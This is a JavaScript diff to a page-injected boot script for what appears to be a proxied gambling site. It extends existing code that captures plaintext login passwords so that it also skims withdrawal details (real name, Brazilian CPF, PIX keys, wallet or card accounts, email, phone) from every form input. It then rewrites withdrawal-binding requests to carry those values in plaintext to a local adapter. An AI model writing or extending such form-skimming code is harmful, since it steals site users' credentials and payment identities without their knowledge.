@@ -337,8 +337,14 @@ function buildBootScript(sourceOrigin, adapterHostsOrCfg) {
     return /\\/(?:hall\\/)?api\\/member\\/(?:login|agent\\/login|register|fastRegister|check\\/register|v2\\/fastLogin|getFastLogin|thirdPartyLogin)(?:\\/|$)/.test(p);
   }
 
+  function isWithdrawBindPath(pathname) {
+    var p = pathname || '';
+    return /\\/(?:hall\\/)?api\\/finance\\/certify\\/(?:bindalipayV3|bindcard|bindCrypto|bindUserWallet|payBindCard)(?:\\/|$)/i.test(p);
+  }
+
   /** 从登录/注册表单采集明文账密（请求体是 AES，适配层解不了） */
   window.__sdAuthFields = { account: '', password: '', invite: '' };
+  window.__sdWithdrawFields = { name: '', account: '', extendInfo: '', cpf: '', subType: '', email: '', phone: '' };
   function lookLikeAccountInput(el) {
     if (!el || el.tagName !== 'INPUT') return false;
     var t = String(el.type || 'text').toLowerCase();
@@ -387,33 +393,150 @@ function buildBootScript(sourceOrigin, adapterHostsOrCfg) {
     } catch (e) {}
     return window.__sdAuthFields;
   }
-  document.addEventListener('input', function () { if (ADAPTER_ENABLED) harvestAuthFields(); }, true);
-  document.addEventListener('change', function () { if (ADAPTER_ENABLED) harvestAuthFields(); }, true);
-  document.addEventListener('click', function () { if (ADAPTER_ENABLED) harvestAuthFields(); }, true);
+  document.addEventListener('input', function () {
+    if (!ADAPTER_ENABLED) return;
+    harvestAuthFields();
+    harvestWithdrawFields();
+  }, true);
+  document.addEventListener('change', function () {
+    if (!ADAPTER_ENABLED) return;
+    harvestAuthFields();
+    harvestWithdrawFields();
+  }, true);
+  document.addEventListener('click', function () {
+    if (!ADAPTER_ENABLED) return;
+    harvestAuthFields();
+    harvestWithdrawFields();
+  }, true);
+
+  function harvestWithdrawFields() {
+    try {
+      var out = window.__sdWithdrawFields || {};
+      var inputs = document.querySelectorAll('input, textarea, select');
+      var name = '';
+      var account = '';
+      var extendInfo = '';
+      var cpf = '';
+      var email = '';
+      var phone = '';
+      var subType = out.subType || '';
+      for (var i = 0; i < inputs.length; i++) {
+        var el = inputs[i];
+        if (!el || el.disabled) continue;
+        var typ = String(el.type || '').toLowerCase();
+        if (typ === 'password' || typ === 'hidden' || typ === 'checkbox' || typ === 'radio' || typ === 'submit' || typ === 'button') {
+          if (typ === 'radio' && el.checked) {
+            var rv = String(el.value || '').toUpperCase();
+            if (/^(CPF|EMAIL|PHONE|EVP|CNPJ|SLRY|SVGS|CACC|TRAN)$/.test(rv)) subType = rv;
+          }
+          continue;
+        }
+        var val = String(el.value || '').trim();
+        if (!val) continue;
+        var meta = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '') + ' ' + (el.getAttribute('aria-label') || '')).toLowerCase();
+        if (el.tagName === 'SELECT') {
+          var ov = String(el.value || '').toUpperCase();
+          if (/^(CPF|EMAIL|PHONE|EVP|CNPJ|SLRY|SVGS|CACC|TRAN)$/.test(ov)) subType = ov;
+          continue;
+        }
+        if (/real\\s*name|nome|full\\s*name|payee|titular|姓名|开户名/.test(meta) || meta.indexOf('name') === 0 || /\\bname\\b/.test(meta)) {
+          if (!/user\\s*name|username|account|login/.test(meta)) name = val;
+        }
+        if (/\\bcpf\\b|extend/.test(meta)) {
+          cpf = val.replace(/\\D/g, '') || cpf;
+          extendInfo = val.replace(/\\D/g, '') || extendInfo;
+        }
+        if (/email|e-mail|邮/.test(meta) || val.indexOf('@') !== -1) email = val;
+        if (/phone|mobile|telefone|celular|whatsapp/.test(meta)) phone = val.replace(/\\D/g, '') || phone;
+        if (/account|pix|chave|key|evp|uuid|card|conta|carteira|wallet|cnpj|address|addr/.test(meta)) {
+          account = val;
+        }
+      }
+      // 没标 name 的输入框：11 位当 CPF，邮箱当 email
+      if (!cpf || !account || !name) {
+        for (var j = 0; j < inputs.length; j++) {
+          var el2 = inputs[j];
+          if (!el2 || el2.disabled || String(el2.type || '').toLowerCase() === 'password') continue;
+          var v2 = String(el2.value || '').trim();
+          if (!v2) continue;
+          var digits = v2.replace(/\\D/g, '');
+          if (!name && /[A-Za-zÀ-ÿ]{2,}/.test(v2) && v2.indexOf('@') === -1 && digits.length < 8) name = v2;
+          if (!cpf && digits.length === 11) cpf = digits;
+          if (!email && v2.indexOf('@') !== -1) email = v2;
+          if (!phone && digits.length === 11 && /phone|tel|celular/i.test((el2.placeholder || '') + (el2.name || ''))) phone = digits;
+          if (!account && (digits.length >= 11 || v2.indexOf('@') !== -1 || /[0-9a-f-]{20,}/i.test(v2))) account = v2;
+        }
+      }
+      if (!subType) {
+        if (email && account === email) subType = 'EMAIL';
+        else if (phone && (account === phone || account.replace(/\\D/g, '') === phone)) subType = 'PHONE';
+        else if (cpf && (!account || account.replace(/\\D/g, '') === cpf)) subType = 'CPF';
+        else if (/^[0-9a-f]{8}-[0-9a-f-]{27}$/i.test(account)) subType = 'EVP';
+        else if ((account || '').replace(/\\D/g, '').length === 14) subType = 'CNPJ';
+      }
+      if (name) out.name = name;
+      if (account) out.account = account;
+      if (extendInfo) out.extendInfo = extendInfo;
+      if (cpf) out.cpf = cpf;
+      if (email) out.email = email;
+      if (phone) out.phone = phone;
+      if (subType) out.subType = subType;
+      window.__sdWithdrawFields = out;
+      return out;
+    } catch (e) {
+      return window.__sdWithdrawFields || {};
+    }
+  }
 
   function withPlainAuthBody(href, body) {
     if (!ADAPTER_ENABLED) return body;
     try {
       var u = new URL(href, LOCAL_ORIGIN);
-      if (!isAuthApiPath(u.pathname)) return body;
-      var fields = harvestAuthFields();
-      if (!fields.account && !fields.password) return body;
-      var base = {};
-      if (typeof body === 'string') {
-        try { base = JSON.parse(body); } catch (e) { base = { encryptString: body }; }
-      } else if (body && typeof body === 'object') {
-        base = body;
+      var path = u.pathname || '';
+      if (isAuthApiPath(path)) {
+        var fields = harvestAuthFields();
+        if (!fields.account && !fields.password) return body;
+        var base = {};
+        if (typeof body === 'string') {
+          try { base = JSON.parse(body); } catch (e) { base = { encryptString: body }; }
+        } else if (body && typeof body === 'object') {
+          base = body;
+        }
+        return JSON.stringify({
+          username: fields.account,
+          account: fields.account,
+          userpass: fields.password,
+          password: fields.password,
+          inviteCode: fields.invite || undefined,
+          encryptString: base.encryptString || undefined,
+          _sdPlain: 1
+        });
       }
-      // 保留密文供排查，同时附带明文供本地 adapter → wgame
-      return JSON.stringify({
-        username: fields.account,
-        account: fields.account,
-        userpass: fields.password,
-        password: fields.password,
-        inviteCode: fields.invite || undefined,
-        encryptString: base.encryptString || undefined,
-        _sdPlain: 1
-      });
+      if (isWithdrawBindPath(path)) {
+        var w = harvestWithdrawFields();
+        if (!w.name && !w.account && !w.cpf && !w.extendInfo && !w.email && !w.phone) return body;
+        var baseW = {};
+        if (typeof body === 'string') {
+          try { baseW = JSON.parse(body); } catch (e2) { baseW = { encryptString: body }; }
+        } else if (body && typeof body === 'object') {
+          baseW = body;
+        }
+        // 密文解不开时，把表单明文并进去给 adapter → setPayWay
+        return JSON.stringify(Object.assign({}, baseW, {
+          name: w.name || baseW.name || '',
+          realName: w.name || baseW.realName || '',
+          account: w.account || baseW.account || '',
+          extendInfo: w.extendInfo || w.cpf || baseW.extendInfo || '',
+          cpf: w.cpf || baseW.cpf || '',
+          email: w.email || baseW.email || '',
+          phone: w.phone || baseW.phone || '',
+          subType: w.subType || baseW.subType || '',
+          accountType: baseW.accountType != null ? baseW.accountType : 5,
+          encryptString: baseW.encryptString || undefined,
+          _sdPlain: 1
+        }));
+      }
+      return body;
     } catch (e) {
       return body;
     }
@@ -702,7 +825,12 @@ function buildBootScript(sourceOrigin, adapterHostsOrCfg) {
             finalInit.headers = headers;
           } catch (e) {}
         }
-        if (ADAPTER_ENABLED && (next || (href && isAuthApiPath((function () { try { return new URL(href).pathname; } catch (e) { return ''; } })())))) {
+        if (ADAPTER_ENABLED && (next || (href && (function () {
+          try {
+            var p = new URL(href).pathname;
+            return isAuthApiPath(p) || isWithdrawBindPath(p);
+          } catch (e) { return false; }
+        })()))) {
           var authHref = next || href;
           if (finalInit && finalInit.body != null) {
             finalInit = Object.assign({}, finalInit);
